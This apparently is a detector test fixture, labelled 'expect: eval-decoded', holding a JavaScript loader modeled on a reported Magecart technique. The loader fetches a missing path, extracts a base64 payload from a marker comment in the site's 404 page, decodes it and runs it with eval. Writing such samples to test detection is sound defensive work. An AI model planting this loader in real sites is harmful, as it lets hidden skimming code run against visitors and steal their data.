// expect: eval-decoded
// Modeled on Akamai, "Magecart abusing 404 pages" (2023): fetch a path that doesn't exist, pull a base64
// payload out of a marker comment in the site's own 404 page, decode it and run it.
fetch('icons').then((r) => r.text()).then((t) => {
  const m = t.match(/COOKIE_ANNOT\s*([A-Za-z0-9+/=]{20,})/);
  if (m) eval(atob(m[1]));
});
